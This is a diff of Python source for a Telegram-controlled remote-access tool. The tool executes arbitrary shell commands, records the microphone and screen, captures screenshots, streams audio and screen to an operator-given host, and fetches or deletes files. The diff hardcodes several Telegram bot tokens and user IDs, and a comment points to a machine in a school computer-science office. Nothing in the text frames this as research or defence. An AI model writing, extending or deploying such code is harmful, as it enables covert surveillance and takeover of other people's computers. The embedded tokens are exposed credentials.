@@ -1,4 +1,4 @@
-import subprocess
+from subprocess import Popen, PIPE
 import pyautogui
 import pyaudio
 import socket
@@ -47,8 +47,9 @@ class Client:
         self.CHANNELS = 1
         self.CHUNK = 8192
         
+        
         self.filename_audio = "recorded_audio.wav"
-        self.filename_video = "video1.avi"
+        self.filename_video = "recorded_video.avi"
 
     def create_markup(self):
         markup = ReplyKeyboardMarkup()
@@ -57,7 +58,7 @@ class Client:
         if len(list_files) >= 230:
             [markup.add(i) for i in list_files[0:228]]
         else:
-            [markup.add(i) for i in list_files]
+            [markup.add(i) for i in list_files[0:228]]
         markup.add("EXIT")
         return markup
 
@@ -126,10 +127,11 @@ class Client:
             def exec_cmd_next(ms):
                 if ms.text != "EXIT":
                     try:
-                        output = subprocess.run(ms.text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                        output = output.stdout + output.stderr
-                        if output:
-                            bot.send_message(ms.chat.id, output, reply_markup=markup)
+                        output = Popen(ms.text.split(" "), stdout=PIPE, stderr=PIPE, shell=True)
+                        result, err = output.communicate()
+                        
+                        if result:
+                            bot.send_message(ms.chat.id, result, reply_markup=markup)
                         else:
                             bot.send_message(ms.chat.id, "<Empty>", reply_markup=markup)
                     except Exception as e:
@@ -167,7 +169,7 @@ class Client:
             os.remove("sreenshot.jpg")
 
 
-        elif ms.text == "record_audio":
+        elif ms.text == "record_microphone":
             markup_record_audio = ReplyKeyboardMarkup()
             markup_record_audio.add("EXIT")
             bot.send_message(ms.chat.id, "Enter time, quantity iteration...", reply_markup=markup_record_audio)
@@ -180,10 +182,10 @@ class Client:
                         time = int(list_data[0])
                         quantity = int(list_data[1])
 
-                        bot.send_message(ms.chat.id, "Recording 🎲")
+                        bot.send_message(ms.chat.id, "Recording 🎲", reply_markup=markup)
 
                         for i in range(quantity):
-                            self.recordAUDIO(time)
+                            self.record_microphone(time)
                             with open(self.filename_audio, 'rb') as audio:
                                 bot.send_audio(ms.chat.id, audio)
 
@@ -229,19 +231,18 @@ class Client:
             bot.send_message(ms.chat.id, "Recording 🎲", reply_markup=markup)
 
             while True:
-                break_time = round(time.time()) + 70
                 video = cv2.VideoWriter(filename=self.filename_video, fourcc=self.FOURCC, fps=15.0, frameSize=(self.SCREEN_SIZE))
-                
-                while os.path.exists(self.filename_video):
-                    index = self.filename_video[5:-4]
-                    self.filename_video = self.filename_video[:-5] + str(int(index) + 1) + ".avi"
 
                 while True:
-                    if round(time.time()) == break_time:
+                    if os.stat(self.filename_video).st_size >= 20185088:
                         cv2.destroyAllWindows()
                         video.release()
-                        break
+                        with open(self.filename_video, "rb") as video:
+                            bot.send_video(ms.chat.id, video)
 
+                        os.remove(self.filename_video)
+                        break
+                    
                     frame = pyautogui.screenshot()
                     frame = np.array(frame)
 
@@ -256,10 +257,12 @@ class Client:
             def get_video_next(ms):
                 if ms.text != "EXIT":
                     try:
-                        bot.send_video(ms.chat.id, open(ms.text, "rb"), reply_markup=markup)
+                        bot.send_message(ms.chat.id, "Sending a video 🎲", reply_markup=markup)
+                        with open(ms.text, "rb") as video:
+                            bot.send_video(ms.chat.id, video)
                         os.remove(ms.text)
                     except Exception as e:
-                        bot.send_message(ms.chat.id, f"Error:\n{e}")
+                        bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
                 else:
                     bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
@@ -278,13 +281,10 @@ class Client:
                         list_data = ms.text.split()
                         PORT = int(list_data[0])
                         HOST = list_data[1]
-                        
-                        self.running_micro = True
-                        thr = Thread(target=self.get_micro, args=(HOST, ms)).start()
+
+                        Thread(target=self.listening_microphone, args=(HOST, ms)).start()
 
                         server_socket_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        __running = True
-
                         try:
                             bot.send_message(ms.chat.id, "Connection attempt 🎲")
                             server_socket_s.connect((HOST, PORT))
@@ -293,6 +293,8 @@ class Client:
                             return
 
                         bot.send_message(ms.chat.id, "Successful connection ✅", reply_markup=markup)
+                        
+                        __running = True
                         while __running:
                             screen = pyautogui.screenshot()
                             frame = np.array(screen)
@@ -313,7 +315,7 @@ class Client:
 
             bot.register_next_step_handler(ms, getscreen_next)
 
-    def recordAUDIO(self, time=6):
+    def record_microphone(self, time=6):
         p = pyaudio.PyAudio()
         stream = p.open(format=self.FORMAT,
                         channels=self.CHANNELS,
@@ -327,8 +329,8 @@ class Client:
             data = stream.read(self.CHUNK)
             frames.append(data)
 
-            with open('dump_record_audio.dat', 'wb') as dump_out:
-                pickle.dump(frames, dump_out, protocol=3)
+            with open('dump_record_microphone.dat', 'wb') as dump_rm:
+                pickle.dump(frames, dump_rm, protocol=3)
 
         stream.stop_stream()
         stream.close()
@@ -341,8 +343,9 @@ class Client:
         wf.writeframes(b"".join(frames))
         wf.close()
 
-    def get_micro(self, HOST, ms):
+    def listening_microphone(self, HOST, ms):
         PORT = 9999
+        __running = True
 
         p = pyaudio.PyAudio()
         stream = p.open(format=self.FORMAT,
@@ -359,13 +362,13 @@ class Client:
             bot.send_message(ms.chat.id, f"Error ❌\n{e}", reply_markup=markup)
             return
 
-        while self.running_micro:
+        while __running:
             try:
                 server_socket_m.sendall(stream.read(self.CHUNK))
             except IOError:
-                self.running_micro = False
+                __running = False
             except:
-                self.running_micro = False
+                __running = False
 
         stream.stop_stream()
         stream.close()
@@ -375,9 +378,12 @@ class Client:
 
 
 """ Variables """
-API_TOKEN = "token"
+API_TOKEN = "6669917733:AAE77ceLu3WIEcwORpqBFQiS3X7Ol-BSCmo" # Для тестов
+# API_TOKEN = "6541278450:AAG3juT44yFShG7nuhfO4R--ySmQqi0avdg" # Последний пк в кб. информатики
+# API_TOKEN = "6635956918:AAHSuBMziJz8mnjdY9VSIB01nfLJxncRuCw" # FREE
 
-ADMIN_ID = id
+ADMIN_ID = 804011643
+MISHA = 1712857832
 
 bot = TeleBot(API_TOKEN)
 
@@ -385,13 +391,14 @@ markup = ReplyKeyboardMarkup(True, True)
 markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
         KeyboardButton("dir"), KeyboardButton("rm_file"),
         KeyboardButton("exec_cmd"), KeyboardButton("get_file"), 
-        KeyboardButton("record_audio"), KeyboardButton("get_audio"),
+        KeyboardButton("record_microphone"), KeyboardButton("get_audio"),
         KeyboardButton("record_video"), KeyboardButton("get_video"),
         KeyboardButton("get_screen"), KeyboardButton("screenshot"))
  
 """ Start """
 client = Client()
 bot.send_message(ADMIN_ID, "ONLINE ✅", reply_markup=markup)
+# bot.send_message(MISHA, "ONLINE ✅", reply_markup=markup)
 
 
 @bot.message_handler(commands=["_start"])
